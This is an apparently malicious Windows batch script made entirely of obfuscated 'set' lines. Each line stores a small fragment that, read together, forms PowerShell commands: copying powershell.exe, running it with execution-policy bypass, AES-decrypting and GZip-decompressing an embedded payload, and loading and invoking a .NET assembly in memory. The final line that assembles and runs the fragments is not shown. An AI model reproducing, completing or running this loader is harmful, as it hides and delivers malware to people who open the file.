@echo off
set "YfWgWyDnrk=0\"
set "ECTMuSixIX=nd"
set "NFfIuoDtnn=ll"
set "XjxmoZrzrV=py"
set "oqZZGIOeEQ=s\"
set "ffLjrVQedR=\v"
set "oykCGHsqyz= C"
set "ysFqkfEaaS=1."
set "qsaoFjAgmX=co"
set "wOrZYphqto=y "
set "GvqqAjOoGs=rS"
set "IklPZoDTfL=em"
set "TcimnnOFur=he"
set "LoOjpZiFnT=rs"
set "MntCBeYWIX=st"
set "biRcZpoObo=ll"
set "rgvDbmHlJe=Po"
set "bAchaPxiiY=ws"
set "DpywhfigPb= /"
set "BwgkUXdohI=Sy"
set "VcvwzHkccn=.e"
set "ujjvEJuBgh=do"
set "sCNSVzgncv=he"
set "WTNcHbXxyB=\W"
set "FMLbZVXIHt=xe"
set "zXbCBULbzr=:\"
set "oFKfYQfWko=Wi"
set "xKBDSJCBSU=we"
set "VZmsnOrYUs=po"
set "KRwHirlqkF=in"
set "QjHNxahVLu=ow"
set "edSRvtdxTA=32"
set "hMmogMKrxY=we"
set "GWqrNWwLYG= %~dp0"
set "GsNkCUtiju=cd"
set "vzxFaJLGZl=m.IO"
set "NUdQkTOGel=ose("
set "hFtrLDNEmL=$PLX"
set "nthWYFWzVy=tS46"
set "ejrOgGzFJv=ring"
set "YOzWMtQDsq=v4Ir"
set "NplXhOcvoC=JlS."
set "CcHpoEwYHr=Stre"
set "WPTOImsAJd=ddin"
set "BtnbZdXtcX=ode]"
set "cmBmExitdE=ment"
set "rqgJsxEOJV=;$Wc"
set "rLfmAJIheq=HERK"
set "OLfVEJfTHk=]::C"
set "OFuqavBlTO=$LHE"
set "XKpLGVXxpZ=S = "
set "qIZNeIWOZM=Invo"
set "MulbnAwfwj=0O+g"
set "pHaslsDLZK=;$ZD"
set "wvZGEMsLhK== $a"
set "bkLHqjcpOp=Secu"
set "oHyVPrdbuN=$avn"
set "tGdmBKeJon=1..-"
set "ryUhrZBqES=qTIz"
set "IoAgFGjUfU=]::N"
set "RMAjtOXhvR=ss -"
set "VaDbAihsHz=tsWi"
set "XVwgAsxyVo=join"
set "tfLMYZRGhO=.Cry"
set "iUNDHvDYmk=C.Su"
set "rmYZSMAjnw=Syst"
set "mTyuzuHhdg=ew-O"
set "irPRzOCQfX= [Sy"
set "RtnNWywneo=  $K"
set "VlglMfCWNh=3); "
set "LZNOdTdmRf=y]::"
set "JjWxeNrTin=m.IO"
set "dLfJkadDak=e]::"
set "rJcuQXosdx=ypto"
set "dBcxNrxHXc=S46e"
set "GJWftVpngh='[-1"
set "NZaPxmYEkR=)))"
set "oiYVUtyChf==');"
set "XbpvzEXTyV=)) {"
set "JSMGAddAGZ=-nop"
set "HXIvlMqZke=PMv."
set "wVuhPrIRpw=Q) {"
set "rOBBUDVTCe=comm"
set "SxliljrAPP= New"
set "knsCUZrPYe=HERK"
set "fqORBKhMHf=-ep "
set "blEZolBJph=6esa"
set "ZwqcLTflDy=pose"
set "NGfmfXqYFu=vnyG"
set "UvHtzfTmdN=bjec"
set "lqIqDgjvtQ=7Yiv"
set "lkrBlFsRkc=m(, "
set "lBQHgfbUmU=k; }"
set "lENxveEAUG=g = "
set "ktZosYuKnB=stem"
set "SuNUyaFxZR=;$kB"
set "BsrcOHqSib=F'[-"
set "NWUtpRGMgf=.Mod"
set "NHmFyAiIMi=.Key"
set "UguVFjgKVv=orF'"
set "crNgrLayIQ=y.Cr"
set "FyuqCHrmvP=G.Pa"
set "SgCUSxbbTq=MFzU"
set "cJCizmpHmS=yste"
set "rCnPkQgqdK=-joi"
set "rtmqLYvDst=Comp"
set "VpkiovOtWO= = N"
set "zbWVQCfKOn=PLXd"
set "irVPYQcLrW=.Con"
set "vtPDYfmOWQ=ck($"
set "TmxeLAiTyY=[Sys"
set "vTotXBsptX=t Sy"
set "caNzkslQll=join"
set "QHxaiFIacP=morF"
set "eufHQtDIuk=736u"
set "ockoplMFrM=::('"
set "szdPVtChan=eam("
set "IckJdwEEhh=and "
set "RCWJKJwQyW=);$W"
set "lCdAxIdWth=..-1"
set "VHjghnxBat=[Sys"
set "yqojEZMGAi=K, 0"
set "soSVxcSVNq=New-"
set "qgqqxdlsWi=bypa"
set "yHeUAjLWlI=saBm"
set "TqCiLRuRPt=pres"
set "WxEVpzHQIj=.Sec"
set "XeYuzoxMPC=stem"
set "LXTsutOZoR=.-16"
set "vhwduaPHSy='dqR"
set "FidXxQrAFe=mory"
set "BZjjxqQNNb=);$P"
set "bGRrkCyaLX=();$"
set "KXbIvLHagZ=pDZz"
set "hVnhrWUqaV=tem."
set "zioDoYmqaS=isfL"
set "WOHQSMWvyi=ress"
set "siBQhwtPQz=LXdV"
set "MgTyIVgEpz=ewLi"
set "ApSbSzXPPG=onve"
set "WEpgkIeaBk=lBlo"
set "IgFFjdqHhs=+hAO"
set "omEfaUmImE=ptog"
set "vqtqxIrtFJ=, (,"
set "yVkatFWhOs=6] -"
set "APOXpqWpAs= [st"
set "wnKibmIGkD=lit("
set "axPATUtjqE=ert]"
set "QrgkfnoaqZ=izo "
set "IsPoCSAwPx=3HWs"
set "tupDReiiRa=gMod"
set "NvIHjQlnPs=ddin"
set "ZzotNerMuB=New-"
set "HUqofGakKL=ecry"
set "eLWDzLfWjy=esFX"
set "yLuiHjyIJS=[Env"
set "HPlNgxpuKg=ptor"
set "CmFIdEEIck=vnyG"
set "hHPnqgNtCz=OyzA"
set "uopOZbPdKX=Bmor"
set "hZwjKacYdC=$kBP"
set "XzaRGaHRzo=LHER"
set "FHedeaLWVy=Secu"
set "KPFLHynpon=.Cry"
set "mXTxFNZNmg=BC;$"
set "XJNXhxbota=Fina"
set "sdYDVBTRkf=bstr"
set "veaylzupbi=comp"
set "kLszFbIwah=$nLp"
set "bytZCarReP=Syst"
set "TbqWjDTjZb=, $L"
set "eRMBEkySpX=tryP"
set "GJiteJpBhB=null"
set "rEdDlTKfFt=($gS"
set "meFMLMpSXb=16] "
set "JcacZEmDkM=[IO."
set "QJzvXvVuBk=UGTu"
set "ErdqLljaxO=yste"
set "outfdngOab=PMv "
set "lBKhHfNNmb=rity"
set "UYfEVyLMUP=.Cre"
set "dmbZeAKEKe=nage"
set "TgJYoWRqNi=ct S"
set "bIEWTQsJjz=;$Bi"
set "HEjHfVwycl=Fo7l"
set "maYmMlqINh=oryS"
set "bfFfjhaaBm=fore"
set "dIMlGFJyDE=hy.A"
set "zrLOGCXErz= '')"
set "gjxymzslga=ress"
set "WCuzmbZgRK=m.Re"
set "XQsfYftaNI=gSIe"
set "NwICcPUTbw=embl"
set "ERJIXgYRJl=pose"
set "KyHiKpnlhP=vert"
set "fWGhaSQRrb= '')"
set "wNrxjhQrVO=tem."
set "thFZATHojJ=fA);"
